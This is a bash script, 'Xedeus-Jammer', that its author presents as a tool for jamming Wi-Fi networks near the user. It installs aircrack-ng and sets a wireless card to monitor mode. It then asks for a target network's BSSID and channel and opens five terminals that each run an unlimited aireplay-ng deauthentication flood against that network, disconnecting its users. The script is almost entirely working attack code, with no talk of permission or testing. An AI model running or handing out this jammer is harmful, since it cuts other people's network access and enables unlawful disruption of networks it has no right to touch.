#!/bin/bash
#Xedeus-Jammer
#Coded by:sn8ow_dev
#Instagram: Sn8ow
#Discord: MIMI#9898

#--------------------------------------------------------#
# Author                 Sn8ow                           #
# Instagram              sn8ow_dev                       #
# Github                 https://github.com/Sn8ow        #
# Resource               https://github.com/Sn8ow/Xedeus #
# Discord                https://discord.gg/Y3rhmyeFZj   #
#          Follow Me On Instagram!!                      #
#--------------------------------------------------------#

clear

trap 'printf "\n";stop' 2
trap 'exit 130' INT

################
#### Start! ####
################

echo -e "\033[1;91m\n[!]Tool Created By Sn8ow[!]\n\033[1;m"

read -rsn1 -p"[!]Ummm Okay ? Press any key to contiune...";echo

printf "\n"

########################
#### Root Warning ! ####
########################

if [[ $EUID -ne 0 ]]; then
   echo -e "\033[1;91m\n[!] Xedeus-Jammer must be run as root. Aborting....¯\_(ツ)_/¯ \n\033[1;m";
   exit 1;
fi   

#####################################
#### Requirements Installation ! ####
#####################################

requirements() {

clear

echo -e "\n[!]Installing Requirements! Please wait...." 
sleep 3

printf "\n"
sudo apt-get install python3 -y
pip install lolcat -y
sudo apt-get install ruby -y
sudo apt-get install pv -y 
sudo apt-get install figlet -y
sudo apt-get install -y aircrack-ng -y 
sudo apt-get install toilet -y
sudo apt-get install xterm -y
sleep 1

clear

}


##################
#### Banner ! ####
##################

banner() {

sleep 2

echo "[!]Requirements Successfully Installed!" | pv -qL 15 | lolcat

sleep 2

clear

toilet -f big -F border "Xedeus Jm" | lolcat

echo "        [ BY: Sn8ow | Instagram: sn8ow_dev | v1.0 Beta ]" | pv -qL 40 | lolcat

printf "\n"

echo "             [ Tool to Jamming WiFi Network Near-You]" | pv -qL 40 | lolcat

printf "\n"

}


#################################
#### Main Script for Jammer! ####
#################################

main() {
sleep 1

echo -e "[!]Please choose the Network Interface:\n" | pv -qL 40 | lolcat

iwconfig | lolcat

read -p $'\033[1;91m[!]Enter Your Choice: \033[1;m' network_interface

echo -e "\n[~]Your Selected NI Card:~[ $network_interface ]\n" | pv -qL 30 | lolcat

sleep 2

printf "\033[1;91m[!]Your Internet or Wifi is going to disconnect.....[Monitor-Mode] \033[1;m\n" | pv -qL 25

sleep 3
############################
#### Aircrack-ng Script!####
############################

airmon-ng start $network_interface | lolcat
sleep 2

clear

sleep 1 

printf "\033[1;91m\n[~]Read Instructions Carefully !! \033[1;m\n" | pv -qL 20 
printf "\n"
sleep 1

printf "[1] After These Instructions, Wifi or Networks near you are going to Display!\n" | pv -qL 30 | lolcat

printf "[2] Please Note Your Targets's BSSID and Channel No.(CH) as they are required in next step!\n" | pv -qL 40 | lolcat

printf "[3] After these You have to Stop the xterm Window(Wifi Window) by Pressing Ctrl + C !\n" | pv -qL 40 | lolcat
printf "\n"
read -rsn1 -p"[!]Press Any Key (After reading the Instructions Carefully!):";echo

mon=$(echo "mon")

xterm -hold -e "airodump-ng $network_interface$mon" &

sleep 2
printf "\n"
read -p $'\033[1;91m[!]Please Enter Target BSSID: \033[1;m' BSSID
printf "\n"
echo ">> BSSID: $BSSID" | lolcat
printf "\n"

read -p $'\033[1;91m[!]Please Enter Target CH: \033[1;m' CH
printf "\n"
echo ">> Channel No: $CH" | lolcat
printf "\n"

echo "[!]OK!" | pv -qL 10 | lolcat
sleep 2

clear

printf "\n"

toilet -f term -F border "BSSID: $BSSID          CH: $CH" | lolcat

printf "\n"

timeout 3 xterm -hold -e "airodump-ng -c $CH --bssid $BSSID $network_interface$mon" &

echo "Your Channel is Selected, Please Wait...!" | pv -qL 20 | lolcat
printf "\n"
sleep 1

########################
#### Attack Start ! ####
########################
echo "[!]Press Any Key To Start Attack!" | lolcat

read -rsn1 -p'_';echo
sleep 2

#xterminals

for i in 1 2 3 4 5
do

xterm -hold -e "aireplay-ng -0 0 -a $BSSID $network_interface$mon" &
done

}

####################
##### Stop Msg #####
####################

stop() {
printf "\n"

echo "[~]Your Attack Has been Started!!!" | pv -qL 10 | lolcat
sleep 2

printf "\n"

toilet -f term -F border "Thank For Using Xedeus-Jammer" | lolcat
printf "\n"

sleep 1

echo "[!]Note:You can type 'sudo airmon-ng stop (network_interface name)mon' to send your NI card from Monitor to Managed Mode!" | lolcat

printf "\n"

echo -e "                             [ BY: Sn8ow | Instagram: sn8ow_dev | v1.0 Beta ]\n" | pv -qL 20 | lolcat

printf "......................................................................................................................" | pv -qL 30 | lolcat

printf "\n"
printf "\n"

}

requirements
banner
main
stop

#--------------------------------------------------------#
# Author                 Sn8ow                           #
# Instagram              sn8ow_dev                       #
# Github                 https://github.com/Sn8ow        #
# Resource               https://github.com/Sn8ow/Xedeus #
# Discord                https://discord.gg/Y3rhmyeFZj   #
#          Follow Me On Instagram!!                      #
#--------------------------------------------------------#
